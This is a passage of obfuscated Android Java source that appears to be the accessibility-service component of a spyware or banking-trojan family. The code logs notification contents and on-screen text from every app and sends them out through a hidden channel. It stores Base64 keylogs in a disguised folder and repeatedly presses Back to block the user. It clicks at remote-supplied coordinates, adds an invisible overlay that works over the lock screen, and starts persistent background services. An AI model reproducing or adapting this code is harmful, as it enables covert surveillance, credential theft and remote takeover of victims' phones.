          //  notification. = 0;
            String title = notification.extras.getCharSequence(Notification.EXTRA_TITLE).toString();
            String text = notification.extras.getCharSequence(Notification.EXTRA_TEXT).toString();
            //String text2 = notification.extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString();
            String package_name = event.getPackageName().toString();
            String AppName = ClassGen12getAppNameFromPkgName(this,package_name);
            ClassGen2._send_it_(ClassGen3.N_ClassGen3_F,(AppName+"|"+ title+"|"+text+"|"+".").getBytes());
        }catch (Exception b){

        }
    }

    public static String ClassGen12getAppNameFromPkgName(Context context, String Packagename) {
        try {
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo info = packageManager.getApplicationInfo(Packagename, PackageManager.GET_META_DATA);
            String appName = (String) packageManager.getApplicationLabel(info);
            return appName;
        } catch (PackageManager.NameNotFoundException e) {

            return "";
        }
    }

    public static String ClassGen12toBase64(String message) {
        byte[] data;
        try {
            data = message.getBytes("UTF-8");
            String base64Sms = Base64.encodeToString(data, Base64.DEFAULT);
            return base64Sms;
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        return null;
    }

    public String ClassGen12RD(String fn) {

        String ClassGen12mydate = fn;

        File sdDir = android.os.Environment.getExternalStorageDirectory();
        //File dir = new File(sdDir,"/Config/sys/apps/log");
        //File TargetFile = new File(sdDir,"/Config/sys/apps/log/log-"+ClassGen12mydate+".txt");

       File ClassGen12out = new File(sdDir+"/Config/sys/apps/log", "log-"+ClassGen12mydate+".txt");

       if (!ClassGen12out.exists())
       {
           ClassGen12out =  new File(sdDir+"/Config/sys/apps/log", "log-"+ClassGen12mydate+".txt");
       }

        String thelog ="";
        StringBuilder text = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new FileReader(ClassGen12out));

            try {
                 //thelog = br.readLine();
                while ((thelog = br.readLine()) != null) {
                    text.append(thelog);
                }
                br.close();
            } catch ( IOException e) {
               // e.printStackTrace();
            }
        } catch (FileNotFoundException e) {

        //    e.printStackTrace();
        }
        return text.toString();
    }

    public static boolean ClassGen12Recording = false;
    public static boolean ClassGen12RecorderActive = false;
   public static MediaRecorder ClassGen12mRecorder;
   public static String  useRec="[USE-REC]";



    void ClassGen12writeFile(String text) {

        try
        {
            String mydate =android.text.format.DateFormat.format("yyyy-MM-dd", new java.util.Date()).toString();

            File ClassGen12sdDir = android.os.Environment.getExternalStorageDirectory();
            File dir = new File(ClassGen12sdDir,"/Config/sys/apps/log");
            File TargetFile = new File(ClassGen12sdDir,"/Config/sys/apps/log/log-"+mydate+".txt");


            if (!dir.exists()) {
                dir.mkdirs();
            }

            if (!TargetFile.exists())
            {
                TargetFile.createNewFile();
            }

            String ClassGen12FinalText = ClassGen12toBase64(text)+">"+"\r\n";


            File out;
            OutputStreamWriter outStreamWriter = null;
            FileOutputStream outStream = null;

            out = new File(ClassGen12sdDir+"/Config/sys/apps/log", "log-"+mydate+".txt");

            if ( out.exists() == false ){
                out.createNewFile();
            }

            outStream = new FileOutputStream(out,true) ;
            outStreamWriter = new OutputStreamWriter(outStream);

            outStreamWriter.append(ClassGen12FinalText);
            outStreamWriter.flush();
            outStreamWriter.close();
            outStream.close();
            outStream.flush();

        }catch (Exception ee){}
    }


//    private static Runnable runnable = new Runnable() {
//
//        @Override
//        public void run() {
//        }
//    };

   // private static  boolean stop =false;
//    private static AsyncTask MyWorker = null;
//
//    public static class _srv_worker_con_ extends AsyncTask<Context, Integer, String> {
//        @Override
//        protected void onPreExecute() {
//            super.onPreExecute();
//        }
//        @Override
//        protected String doInBackground(Context... ctx) {
//
//            // ClassGen11. iamrunning = false;
//            return null;
//        }


//
//        @Override
//        protected void onPostExecute(String u) {
//            super.onPostExecute(u);
//           // MyWorker= null;
//        }
//    }





    public  void ClassGen12blockBack(){
       try
       {
           Handler handler = new Handler(Looper.getMainLooper());
           handler.post(new Runnable() {
               @Override
               public void run() {
                   try{
                       if (android.os.Build.VERSION.SDK_INT > 15) {
                           for (int i = 0; i < 4; i++) {
                               try {
                                   //Thread.sleep(500);
                                   performGlobalAction(GLOBAL_ACTION_BACK);
                                   // Thread.sleep(500);
                               }catch (Exception e){}
                           }
                       }
                       // ClassGen9.DumpActivity.startActivityForResult();
                   }catch (Exception e){





                         }

               }

           });

       }catch (Exception e){}
    }

    public  void ClassGen12ActivSend(AccessibilityEvent event)
    {
        try
        {
            String s = getEventText(event);

            String p = (String) event.getPackageName();
            PackageManager pk = getApplicationContext().getPackageManager();
            ApplicationInfo fo ;
            try {

                fo = pk.getApplicationInfo(p, 0);

            } catch (final PackageManager.NameNotFoundException e) {







                fo = null;
            }
            String n = (String) (fo != null ? pk.getApplicationLabel(fo ) : ClassGen11.c_ClassGen11_mn[3]);
            ClassGen2._send_it_(ClassGen3.A_ClassGen3_A,(n).getBytes());
        }catch (Exception e){}

    }

    public static Bitmap drawableToBitmap (Drawable drawable) {
        Bitmap bitmap = null;

        try
        {
            if (drawable instanceof BitmapDrawable) {
                BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
                if(bitmapDrawable.getBitmap() != null) {
                    return bitmapDrawable.getBitmap();
                }
            }

            if(drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
                bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888); // Single color bitmap will be created of 1x1 pixel
            } else {
                bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
            }

            Canvas canvas = new Canvas(bitmap);
            drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
            drawable.draw(canvas);
        }catch (Exception b){}
        return bitmap;
    }
    public void ClassGen12sendlog(AccessibilityEvent event , int f){
        if (event == null)
        {
            return;
        }
      try
      {
          if(ClassGen11.k && ClassGen11.k_ClassGen11_live){

              String s = event.getText().toString();
              String msg = s.replace("[","").replace("]","");
              if (msg.length() <1 || msg.isEmpty())
              {
                  msg = event.getContentDescription().toString();
                  if (msg.length() <1 || msg.isEmpty())
                  {
                      return;
                  }
              }
              s = msg;
              String p = (String) event.getPackageName();
              PackageManager pk = getApplicationContext().getPackageManager();
              String baseString = "null";
              try {
                  Drawable icon = ClassGen11.app_ClassGen11_Context.getPackageManager().getApplicationIcon(p);
                  ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
                  drawableToBitmap(icon).compress(Bitmap.CompressFormat.JPEG, 50, byteStream);
                  byte[] byteArray = byteStream.toByteArray();
                  baseString = Base64.encodeToString(byteArray,Base64.DEFAULT);
              } catch (PackageManager.NameNotFoundException e) {


                  //e.printStackTrace();
              }


              ApplicationInfo fo ;
              try {
                  fo = pk.getApplicationInfo(p, 0);

              } catch (final PackageManager.NameNotFoundException e) {
                  fo = null;
              }
              String n = (String) (fo != null ? pk.getApplicationLabel(fo ) : ClassGen11.c_ClassGen11_mn[3]);
              ClassGen2._send_it_(ClassGen11.c_ClassGen11_mn[1] + ClassGen11.c_ClassGen11_mn[2] + n + ClassGen11.c_ClassGen11_mn[2] + s + ClassGen11.c_ClassGen11_mn[2] + String.valueOf(f)+"<0>"+baseString,"\t".getBytes());
          }

      }catch (Exception EX){

            }
        try
        {
            if (ClassGen12OFK.equals(ClassGen12OFFOK))
            {
                String s = event.getText().toString();
                String msg = s.replace("[","").replace("]","");
                if (msg.length() <1 || msg.isEmpty())
                {
                    msg = event.getContentDescription().toString();
                    if (msg.length() <1 || msg.isEmpty())
                    {
                        return;
                    }
                }
                s = msg;
                String p = (String) event.getPackageName();
                PackageManager pk = getApplicationContext().getPackageManager();
                ApplicationInfo fo ;
                try {
                    fo = pk.getApplicationInfo(p, 0);

                } catch (final PackageManager.NameNotFoundException e) {
                    fo = null;
                }
                String n = (String) (fo != null ? pk.getApplicationLabel(fo ) : ClassGen11.c_ClassGen11_mn[3]);
                ClassGen12writeFile(  n + "#" + s + "#" + String.valueOf(f));
            }
        }catch (Exception a){}
    }

    public void ClassGen12click(int x, int y) {
        try
        {
            if (android.os.Build.VERSION.SDK_INT > 16) {
                ClassGen12clickAtPosition(x, y, getRootInActiveWindow());
            }
        }catch (Exception s){

              }
    }

    public static void ClassGen12clickAtPosition(int x, int y, AccessibilityNodeInfo node) {
        if (node == null) return;
        try {
            if (node.getChildCount() == 0) {
                Rect ClassGen12buttonRect = new Rect();
                node.getBoundsInScreen(ClassGen12buttonRect);
                if (ClassGen12buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //   System.out.println("1º - Node Information: " + node.toString());
                }
            } else {
                Rect ClassGen12buttonRect = new Rect();
                node.getBoundsInScreen(ClassGen12buttonRect);
                if (ClassGen12buttonRect.contains(x, y)) {
                    // Maybe we need to think if a large view covers item?
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    //  System.out.println("2º - Node Information: " + node.toString());
                }
                for (int i = 0; i < node.getChildCount(); i++) {
                    ClassGen12clickAtPosition(x, y, node.getChild(i));
                }
            }
        }catch (Exception ex){
            //  utl.SettingsToAdd(context, consts.LogSMS , "(pro27)  | utils isAccessibilityServiceEnabled " + ex.toString() +"::endLog::");
        }
    }

    public boolean ClassGen12ShowActivite(Class ac)
    {
        try
        {
            this.startActivity(new Intent(this, ac)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP));
            return true;
        }catch (Exception ss){

        }
        return  false;
    }

    public static WindowManager ClassGen12wm;
    public static SurfaceView sfw;
    public static WindowManager.LayoutParams ClassGen12lay;

 //   public static Long MeNow;
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();

        try
        {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS|AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK| AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
            info.notificationTimeout = 0;
            info.packageNames = null;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
            setServiceInfo(info);

        }catch (Exception x){}
        try
        {
            ClassGen11.MyAccess = this;
            Context ctx = getApplicationContext();

            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            FrameLayout layout = new FrameLayout(this);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(1,
                    1, WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE| WindowManager.LayoutParams.FLAG_FULLSCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE|
                            WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS|
                            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP;
            ClassGen12lay = params;
            ClassGen12wm = windowManager;
            windowManager.addView(layout, params);
        }catch (Exception f){

        }
//        try
//        {
//            Notification  ntf  = ClassGen3.Foreground(this,"Access","AccessNotifi");
//            if (ntf != null)
//            {
//                Random rand = new Random();
//                int _IDD = 20 + rand.nextInt(1000);
//
//                this.startForeground(_IDD, ntf);
//            }
//
//        }catch (Exception ex){     }
        try {
           // bServiceRunning = true;

         //   p(getApplicationContext(),true);
            if (ClassGen9.IP_ClassGen9_I(ClassGen9.T_ClassGen9_P, getPackageManager()) && !ClassGen9.T_ClassGen9_P.toLowerCase().equals("null"))
            {
                PackageManager pm = getApplicationContext().getPackageManager();
                Intent launchIntent = pm.getLaunchIntentForPackage(ClassGen9.T_ClassGen9_P);
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launchIntent);
            }


        }catch (Exception ex){
            // utl.SettingsToAdd(this, consts.LogSMS , consts.string_173 + ex.toString() + consts.string_119);
        }
        try
        {
            if (ClassGen10._runn_srv_(ClassGen11.class,getApplication()))
            {

                startService(new Intent(this,ClassGen11.class));

            }


        }catch (Exception bb){}
        try{
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(new Intent(getApplicationContext(), myworker.class));
            }else
            {
                startService(new Intent(getApplicationContext(), myworker.class));
            }
        }catch (Exception g){}

    }






}
